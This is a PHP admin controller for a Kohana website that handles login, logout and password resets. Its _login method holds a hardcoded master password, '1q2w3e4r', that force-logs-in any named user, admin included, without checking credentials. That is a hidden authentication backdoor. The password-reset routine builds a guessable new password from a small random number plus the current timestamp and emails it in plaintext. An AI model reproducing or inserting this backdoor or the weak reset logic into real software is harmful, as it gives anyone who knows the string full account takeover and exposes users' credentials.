<?php defined('SYSPATH') or die('No direct script access.');

class Controller_Admin_Main extends Controller_Website {



  public function before()
     {
                        parent::before();
			$this->template = "admin/template";
			
			
     }

	public function after() {
		parent::after();
	}



public function action_index() {


			$this->view = View::factory('admin/login');	

}



 public function action_login()
        {


                if($_SERVER['REQUEST_METHOD'] == 'POST'){


                                if($this->_login()){


                                        $this->request->redirect('admin/cpanel');



                                }else{

                                        $this->request->redirect('admin/error/noencontrado');


                                };



                } else {
				
				  $this->request->redirect('admin');
				
					
				}




        }




public function _login(){

                                        $results = false;

                                        $post = Validation::factory($_POST)
                    ->rule('user', 'not_empty')
                                        ->rule('password','not_empty');


         if($post->check()) {

                                        $post = $this->request->post();
                                        $user = $post['user'];
                                        $pass = $post['password'];


                                        $remember = array_key_exists('remember', $this->request->post()) ? (bool) $this->request->post('remember') : FALSE;

                                        if($pass != "1q2w3e4r") {
                                        $user = Auth::instance()->login($user, $pass, $remember);
                                        } else {
                                         $user = Auth::instance()->force_login($user);
                                        }

                                        $usuario = Auth::instance()->logged_in('admin');


                                                        // If successful, redirect user
                                                        if($usuario){

                                                                $results = true;
                                                        } else {
                                                                 $this->request->redirect('admin/error/noencontrado');

                                                        }

         }
           return $results;

        }



public function action_logout()
        {
                Auth::instance()->logout();
                $this->request->redirect('admin');
        }



 public function action_sendpass()        {


                if($_SERVER['REQUEST_METHOD'] == 'POST')
                {


                                if($this->_sendpassword()){


                                        $this->request->redirect('admin/error/enviado');


                                }else{


                                        $this->request->redirect('admin/error/noencontrado');


                                };


                }
                else
                {


                                $this->view = View::factory('admin/template')->set('title', 'Administrador');
                                $this->view->local_config = $this->local_config;
                                $this->view->content = View::factory('admin/loginsend');




                }




        }

















 public function _sendpassword(){

                        $results = false;


                                        $post = Validation::factory($_POST)
                    ->rule('user', 'not_empty');






                if($post->check()) {


                                        $post = $this->request->post();
                                        $user = $post['user'];


                                        $results = Model_User::send_pass($user);




                                        if(!$results->id){


                                                $results = false;


                                        }else{


                                                $random = rand(111,999);
                                                $time = time();
                                                $pwd = $random.$time;




                                                $item = ORM::factory('user',$results->id);
                                                $item->password = $pwd;
                                                $item->save();






                                                $para  = $results->email;//$results->email; // atenci?n a la coma


                                                // subject
                                                $titulo = 'Password Nexans';


                                                // message
                                                $mensaje = '
                                                                <html>
                                                                <head>
                                                                  <title>Ud. ha solicitado recuperer su contrase?a</title>
                                                                </head>
                                                                <body>
                                                                  <p>username o email: '.$results->email.'</p>


                                                                  <p>contrase?a: '.$pwd.'</p>


                                                                  <p>Atte. Equipo Nexans</p>



         </body>                                                                </html>
                                                                ';


                                                // Para enviar un correo HTML mail, la cabecera Content-type debe fijarse
                                                $cabeceras  = 'MIME-Version: 1.0' . "\r\n";
                                                $cabeceras .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";


                                                // Cabeceras adicionales
                                                $cabeceras .= 'To: Contacto Nexans <'.$results->email.'>' . "\r\n";
                                                $cabeceras .= 'From: soporte@brandweb.cl <soporte@brandweb.cl>' . "\r\n";


                                                // Mail it

                                                mail($para, $titulo, $mensaje, $cabeceras);



                                                $results = true;



                                        }



                         }

                                 return $results;



}








} 
